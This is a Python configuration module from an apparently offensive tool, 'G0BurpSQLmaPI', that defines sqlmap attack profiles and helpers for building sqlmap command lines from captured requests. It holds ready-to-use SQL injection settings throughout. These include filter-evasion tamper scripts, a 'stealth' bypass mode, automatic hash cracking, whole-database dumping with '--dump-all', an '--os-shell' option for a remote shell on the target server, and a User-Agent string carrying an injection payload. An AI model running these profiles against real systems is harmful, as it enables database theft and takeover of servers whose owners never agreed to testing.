# ============================================================
#  G0BurpSQLmaPI - SQLMAP PAYLOAD PROFILES
#  Stable, real-world oriented profiles
# ============================================================

# ============================
# SQLMAP default tamper set
# ============================
TAMPERS = "between,randomcase,space2comment"

# ============================
# SQLMAP attack profiles
# ============================
SQLMAP_PROFILES = {

    # --------------------------------------------------------
    # AGGRESSIVE
    # --------------------------------------------------------
    "aggressive": {
        "name": "🔥 AGGRESSIVE",
        "description": "Fast scanning profile with medium noise",
        "options": [
            "--batch",
            "--answers=crack=Y,dict=Y,continue=Y,quit=N",
            "--risk=2",
            "--level=3",
            f"--tamper={TAMPERS}",
            "--dump",
        ],
    },

    # --------------------------------------------------------
    # STEALTH
    # --------------------------------------------------------
    "stealth": {
        "name": "🛡️ STEALTH",
        "description": "Low-noise bypass mode",
        "options": [
            "--batch",
            "--answers=crack=Y,dict=Y,continue=Y,quit=N",
            "--risk=1",
            "--level=1",
            "--technique=E",
            f"--tamper={TAMPERS}",
            "--dump",
        ],
    },

    # --------------------------------------------------------
    # TIME BASED
    # --------------------------------------------------------
    "time_based": {
        "name": "⏱️ TIME-BASED",
        "description": "Blind SQLi timing attack",
        "options": [
            "--batch",
            "--answers=crack=Y,dict=Y,continue=Y,quit=N",
            "--risk=3",
            "--level=5",
            "--technique=T",
            "--time-sec=10",
            "--dump",
        ],
    },

    # --------------------------------------------------------
    # FULL DUMP
    # --------------------------------------------------------
    "full_dump": {
        "name": "📊 FULL DUMP",
        "description": "Dump entire databases",
        "options": [
            "--batch",
            "--answers=crack=Y,dict=Y,continue=Y,quit=N",
            "--dump-all",
            "--risk=3",
            "--level=5",
            f"--tamper={TAMPERS}",
        ],
    },

    # --------------------------------------------------------
    # ULTIMATE
    # --------------------------------------------------------
    "ultimate": {
        "name": "💀 ULTIMATE",
        "description": "Maximum brute force & enumeration",
        "options": [
            "--batch",
            "--answers=crack=Y,dict=Y,continue=Y,quit=N",
            "--risk=3",
            "--level=5",
            "--threads=10",
            "--technique=BEUSTQ",
            "--os-shell",
            f"--tamper={TAMPERS}",
        ],
    },

    # ============================
	# BOOLEAN BLIND — SAFE (no-cast)
	# ============================
	"boolean_mysql_blind_nocast": {
    "name": "🧠 BOOLEAN BLIND (NO-CAST)",
    "description": "Blind MySQL/MariaDB, avoids CAST errors (HTTP 500 safe)",
    "options": [
        "--batch",
        "--answers=crack=Y,dict=Y,continue=Y,quit=N",
        "--technique=B",
        "--dbms=mysql",
        "--no-cast",
        "--level=5",
        "--risk=3",
        "--time-sec=10",
        "--threads=3",
        "--flush-session",
        "--current-db",
    ],
},

	# ============================
	# BOOLEAN BLIND — HEX (stable)
	# ============================
	"boolean_mysql_blind_hex": {
    "name": "🧠 BOOLEAN BLIND (HEX)",
    "description": "Blind MySQL/MariaDB using hex encoding (no --no-cast)",
    "options": [
        "--batch",
        "--answers=crack=Y,dict=Y,continue=Y,quit=N",
        "--technique=B",
        "--dbms=mysql",
        "--hex",
        "--level=5",
        "--risk=3",
        "--time-sec=10",
        "--threads=3",
        "--flush-session",
        "--current-db",
    ],
},	
    # --------------------------------------------------------
    # CUSTOM
    # --------------------------------------------------------
    "custom": {
        "name": "⚙️ CUSTOM",
        "description": "User-defined SQLmap flags",
        "options": [],
    },

    # --------------------------------------------------------
    # DEFAULT FULL (legacy, LAST)
    # --------------------------------------------------------
    "default_full": {
        "name": "⭐ DEFAULT FULL",
        "description": "Original G0BurpSQLmaPI heavy flags with SQL payload injection in User-Agent",
        "options": [
            "--tamper=space2comment",
            "--dbms=mysql",
            "--time-sec=11",
            "--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36' and '6100'='6100",
            "--level=5",
            "--risk=3",
            "--batch",
            "--flush-session",
            "--technique=BEUSTQ",
            "--union-char=UCHAR",
            "--answers=crack=Y,dict=Y,continue=Y,quit=N",
            "--dump"
        ]
    },
    "random_agent": {
        "name": "⭐ RANDOM AGENT",
        "description": "Same configuration but with random User-Agent",
        "options": [
            "--tamper=space2comment",
            "--dbms=mysql",
            "--time-sec=11",
            "--random-agent",
            "--level=5",
            "--risk=3",
            "--batch",
            "--flush-session",
            "--technique=BEUSTQ",
            "--union-char=UCHAR",
            "--answers=crack=Y,dict=Y,continue=Y,quit=N",
            "--dump"
        ]
    },
    "both_attempt": {
        "name": "⚠️ ATTEMPT BOTH (CONFLICT)",
        "description": "WARNING: --user-agent overrides --random-agent. This uses random-agent first, then switches to payload",
        "options": [
            "--tamper=space2comment",
            "--dbms=mysql",
            "--time-sec=11",
            "--random-agent",
            "--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36' and '6100'='6100",
            "--level=5",
            "--risk=3",
            "--batch",
            "--flush-session",
            "--technique=BEUSTQ",
            "--union-char=UCHAR",
            "--answers=crack=Y,dict=Y,continue=Y,quit=N",
            "--dump"
        ]
    }
}


# ============================================================
# HELPERS
# ============================================================

def get_attack_profile(name: str):
    """Return profile options by name; fallback to aggressive."""
    return SQLMAP_PROFILES.get(
        name, SQLMAP_PROFILES["aggressive"]
    )["options"]


def get_sqlmap_default_args(MODULES_EXPLOIT_PATH, params_flag, profile="default_full"):
    """
    Build SQLmap args from exploit path, params list, and chosen profile.
    """
    args = ["-r", str(MODULES_EXPLOIT_PATH), *params_flag]

    profile_data = SQLMAP_PROFILES.get(profile)
    if profile_data:
        args += profile_data["options"]
    else:
        args += SQLMAP_PROFILES["default_full"]["options"]

    return args
